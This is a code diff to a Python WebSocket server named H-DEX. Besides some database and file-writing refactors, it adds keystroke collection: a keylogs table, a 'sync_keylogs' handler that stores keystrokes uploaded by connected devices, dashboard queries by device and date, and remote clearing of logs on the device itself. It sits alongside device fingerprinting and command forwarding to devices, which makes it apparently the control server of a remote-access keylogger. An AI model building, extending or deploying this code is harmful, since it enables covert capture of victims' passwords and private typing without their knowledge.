@@ -77,10 +77,17 @@ import sqlite3
 class Database:
     def __init__(self, db_path="hdex_data.db"):
         self.db_path = db_path
+        self._conn = None
         self.init_db()
 
+    def _get_conn(self):
+        if self._conn is None:
+            self._conn = sqlite3.connect(self.db_path)
+            self._conn.row_factory = sqlite3.Row
+        return self._conn
+
     def init_db(self):
-        conn = sqlite3.connect(self.db_path)
+        conn = self._get_conn()
         cur = conn.cursor()
         
         # Devices table
@@ -108,11 +115,21 @@ class Database:
         )
         ''')
         
+        # Keylogs table
+        cur.execute('''
+        CREATE TABLE IF NOT EXISTS keylogs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            device_id TEXT,
+            timestamp DATETIME,
+            key TEXT,
+            synced INTEGER DEFAULT 0
+        )
+        ''')
+        
         conn.commit()
-        conn.close()
 
     def update_device(self, dev_info):
-        conn = sqlite3.connect(self.db_path)
+        conn = self._get_conn()
         cur = conn.cursor()
         now = datetime.now().isoformat()
         
@@ -134,25 +151,64 @@ class Database:
             'online'
         ))
         conn.commit()
-        conn.close()
 
     def log_action(self, action, details, source_ip=""):
-        conn = sqlite3.connect(self.db_path)
+        conn = self._get_conn()
         cur = conn.cursor()
         cur.execute('INSERT INTO audit_log (timestamp, action, details, source_ip) VALUES (?, ?, ?, ?)',
                     (datetime.now().isoformat(), action, details, source_ip))
         conn.commit()
-        conn.close()
 
     def get_all_devices(self):
-        conn = sqlite3.connect(self.db_path)
-        # Using row_factory to get dict-like access
-        conn.row_factory = sqlite3.Row
+        conn = self._get_conn()
         cur = conn.cursor()
         cur.execute('SELECT * FROM devices')
         rows = cur.fetchall()
-        conn.close()
         return [dict(row) for row in rows]
+
+    def update_device_status(self, device_id, status):
+        conn = self._get_conn()
+        cur = conn.cursor()
+        cur.execute('UPDATE devices SET status=?, last_seen=? WHERE id=?',
+                    (status, datetime.now().isoformat(), device_id))
+        conn.commit()
+
+    def save_keylog_batch(self, device_id, entries):
+        conn = self._get_conn()
+        cur = conn.cursor()
+        now = datetime.now().isoformat()
+        for entry in entries:
+            ts = entry.get("timestamp", now)
+            key = entry.get("key", "")
+            cur.execute('INSERT INTO keylogs (device_id, timestamp, key, synced) VALUES (?, ?, ?, 1)',
+                        (device_id, ts, key))
+        conn.commit()
+
+    def get_keylogs(self, device_id=None, limit=500):
+        conn = self._get_conn()
+        cur = conn.cursor()
+        if device_id:
+            cur.execute('SELECT * FROM keylogs WHERE device_id=? ORDER BY id DESC LIMIT ?',
+                        (device_id, limit))
+        else:
+            cur.execute('SELECT * FROM keylogs ORDER BY id DESC LIMIT ?', (limit,))
+        return [dict(row) for row in cur.fetchall()]
+
+    def get_keylogs_by_date(self, device_id, start_date, end_date, limit=1000):
+        conn = self._get_conn()
+        cur = conn.cursor()
+        cur.execute('SELECT * FROM keylogs WHERE device_id=? AND timestamp BETWEEN ? AND ? ORDER BY id ASC LIMIT ?',
+                    (device_id, start_date, end_date, limit))
+        return [dict(row) for row in cur.fetchall()]
+
+    def clear_keylogs(self, device_id=None):
+        conn = self._get_conn()
+        cur = conn.cursor()
+        if device_id:
+            cur.execute('DELETE FROM keylogs WHERE device_id=?', (device_id,))
+        else:
+            cur.execute('DELETE FROM keylogs')
+        conn.commit()
 
 db = Database()
 
@@ -292,8 +348,22 @@ class HDexServer:
             filename = f"{device_name}_{device_ip}.txt"
             filepath = os.path.join(logs_dir, filename)
             
-            # Prepare device info text
             current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            
+            # Read existing history if file exists
+            connection_count = 0
+            if os.path.exists(filepath):
+                try:
+                    with open(filepath, 'r', encoding='utf-8') as f:
+                        existing = f.read()
+                    if "CONNECTION HISTORY" in existing:
+                        history_start = existing.find("CONNECTION HISTORY")
+                        history_section = existing[history_start:]
+                        connection_count = history_section.count("[CONNECTED]")
+                except:
+                    pass
+            
+            connection_count += 1
             
             content = f"""================================================================================
                           H-DEX DEVICE CONNECTION LOG
@@ -337,27 +407,14 @@ GPU:            {info.get('gpu', 'Unknown')}
 
 """
             
-            # Check if file exists to append connection history
-            if os.path.exists(filepath):
-                # Read existing content and extract connection history
-                with open(filepath, 'r', encoding='utf-8') as f:
-                    existing = f.read()
-                
-                # Find connection history section and append
-                if "CONNECTION HISTORY" in existing:
-                    history_start = existing.find("CONNECTION HISTORY")
-                    history_section = existing[history_start:]
-                    # Count existing connections
-                    connection_count = history_section.count("[CONNECTED]") + 1
-                    content += f"[{connection_count}] [{current_time}] [CONNECTED] - Session Started\n"
-                else:
-                    content += f"[1] [{current_time}] [CONNECTED] - First Connection\n"
-            else:
-                content += f"[1] [{current_time}] [CONNECTED] - First Connection\n"
+            # Append connection history entry
+            content += f"[{connection_count}] [{current_time}] [CONNECTED] - Session Started\n"
             
-            # Write to file
-            with open(filepath, 'w', encoding='utf-8') as f:
+            # Atomically write to temp file, then replace
+            tmppath = filepath + '.tmp'
+            with open(tmppath, 'w', encoding='utf-8') as f:
                 f.write(content)
+            os.replace(tmppath, filepath)
             
             logger.info(f"📄 Device info saved to: {filepath}")
             
@@ -384,12 +441,7 @@ GPU:            {info.get('gpu', 'Unknown')}
             
             # Update DB status
             try:
-                conn = sqlite3.connect(self.db.db_path)
-                cur = conn.cursor()
-                cur.execute('UPDATE devices SET status=?, last_seen=? WHERE id=?', 
-                           ('offline', datetime.now().isoformat(), device_id_to_remove))
-                conn.commit()
-                conn.close()
+                self.db.update_device_status(device_id_to_remove, 'offline')
                 self.db.log_action('DEVICE_DISCONNECT', f"Device disconnected: {device_id_to_remove}")
             except Exception as e:
                 logger.error(f"DB Error: {e}")
@@ -528,6 +580,16 @@ GPU:            {info.get('gpu', 'Unknown')}
                     elif msg_type == "register_dashboard":
                         await self.register_dashboard(websocket, data)
 
+                    elif msg_type == "pong":
+                        device_id = next(
+                            (id for id, c in self.clients.items() if c["websocket"] == websocket),
+                            None
+                        )
+                        if device_id:
+                            if device_id not in self.connection_health:
+                                self.connection_health[device_id] = {}
+                            self.connection_health[device_id]['last_pong'] = time.time()
+
                     # Server status request
                     elif msg_type == "get_server_status":
                         status = await self.get_server_status()
@@ -557,6 +619,57 @@ GPU:            {info.get('gpu', 'Unknown')}
                                 cmd_data = data.get("data", {})
                                 cmd_data["type"] = cmd_type
                                 await client_data["websocket"].send(json.dumps(cmd_data))
+                            except:
+                                pass
+
+                    # Keylog sync from devices (batch upload)
+                    elif msg_type == "sync_keylogs":
+                        device_id = data.get("device_id", "unknown")
+                        entries = data.get("entries", [])
+                        if entries:
+                            self.db.save_keylog_batch(device_id, entries)
+                            self.log_activity('KEYLOG_SYNC', f"Synced {len(entries)} keys from {device_id}")
+                        await websocket.send(json.dumps({"type": "sync_ack", "count": len(entries)}))
+
+                    # Get keylogs from server (dashboard request)
+                    elif msg_type == "get_keylogs":
+                        if websocket in self.dashboards:
+                            device_id = data.get("device_id")
+                            limit = data.get("limit", 500)
+                            logs = self.db.get_keylogs(device_id, limit)
+                            await websocket.send(json.dumps({
+                                "type": "keylog_history",
+                                "logs": [{k: str(v) if v else "" for k, v in log.items()} for log in logs],
+                                "device_id": device_id
+                            }))
+
+                    # Get keylogs by date from server
+                    elif msg_type == "get_keylogs_by_date":
+                        if websocket in self.dashboards:
+                            device_id = data.get("device_id")
+                            start_date = data.get("start_date")
+                            end_date = data.get("end_date")
+                            logs = self.db.get_keylogs_by_date(device_id, start_date, end_date)
+                            await websocket.send(json.dumps({
+                                "type": "keylog_history",
+                                "logs": [{k: str(v) if v else "" for k, v in log.items()} for log in logs],
+                                "device_id": device_id
+                            }))
+
+                    # Clear server keylogs
+                    elif msg_type == "clear_keylogs":
+                        device_id = data.get("device_id")
+                        self.db.clear_keylogs(device_id)
+                        if websocket in self.dashboards:
+                            await websocket.send(json.dumps({
+                                "type": "command_output",
+                                "output": f"Server keylogs cleared for {device_id or 'all devices'}"
+                            }))
+                        # Also forward to device so it clears its local file
+                        target_id = data.get("target_id") or data.get("device_id")
+                        if target_id and target_id in self.clients:
+                            try:
+                                await self.clients[target_id]["websocket"].send(message)
                             except:
                                 pass
 
